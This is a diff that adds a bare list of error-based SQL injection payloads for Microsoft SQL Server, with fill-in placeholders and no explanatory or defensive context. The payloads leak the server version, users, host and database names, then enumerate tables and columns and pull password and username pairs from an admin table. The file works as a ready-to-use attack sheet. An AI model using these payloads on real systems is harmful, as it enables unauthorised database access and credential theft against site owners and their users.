@@ -1,0 +1,20 @@
+ convert(int,@@version COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1
+ convert(int,user COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1
+ convert(int,system_user COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1
+ convert(int,host_name() COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1
+ convert(int,@@SERVERNAME COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1
+ convert(int,db_name() COLLATE SQL_Latin1_General_Cp1254_CS_AS) and 1=1
+ convert(int,(char(72)%2bchar(82)%2b(select top 1 cast(count([name]) as nvarchar(4000)) from [master]..[sysdatabases] )%2bchar(82)%2bchar(72))) and 1=1
+ convert(int,(select cast(name as nvarchar(4000)) from master..sysdatabases where dbid=N)) and 1=1
+ convert(int,(char(72)%2bchar(82)%2b(select top 1 cast(count(*) as nvarchar(4000)) from information_schema.tables )%2bchar(82)%2bchar(72))) and 1=1
+ convert(int,(char(126)%2b(select distinct top 1 table_name from (select distinct top N table_name from information_schema.tables order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))) and 1=1
+ convert(int,(char(126)%2b(select distinct top 1 column_name from (select distinct top N column_name from information_schema.columns where table_name=<InsertChar()ofTableName> order BY column_name ASC) sq order BY column_name DESC)%2bchar(126))) and 1=1
+ convert(int,(char(72)%2bchar(82)%2b(select top 1 cast(count(*) as nvarchar(4000)) from [TableName] )%2bchar(82)%2bchar(72))) and 1=1
+ convert(int,(char(72)%2bchar(82)%2b(select top 1 isnull([PASSWD],char(126))%2bchar(94)%2bisnull([USERNAME],char(126)) from (select top 1 [PASSWD],[USERNAME] from [Admin] order by [PASSWD] asc) sq order by [PASSWD] desc)%2bchar(82)%2bchar(72))) and 1=1
+ convert(int,(char(126)%2b(select distinct top 1 table_name from (select distinct top N table_name from DatabaseName.OwnerName.ObjectORtableName order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))) and 1=1
+ convert(int,(char(126)%2b(select distinct top 1 table_name from (select distinct top 1 table_name from logosoft.information_schema.tables order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))) and 1=1
+ convert(int,(char(126)%2b(select distinct top 1 column_name from (select distinct top N column_name from DatabaseName.OwnerName.ObjectORColumnName where table_name=<InsertChar()ofTableName> order BY column_name ASC) sq order BY column_name DESC)%2bchar(126))) and 1=1
+ convert(int,(char(72)%2bchar(82)%2b(select top 1 cast(count(*) as nvarchar(4000)) from [DatabaseName]..[TableName] )%2bchar(82)%2bchar(72))) and 1=1
+ convert(int,(char(82)%2bchar(33)%2b(select top 1 isnull([ColumnName],char(32)) from (select top 1 [ColumnName] from [DatabaseName]..[TableName] order by [ColumnName] asc) sq order by [ColumnName] desc)%2bchar(33)%2bchar(82))) and 1=1
+ 
+ HR = 72, 82
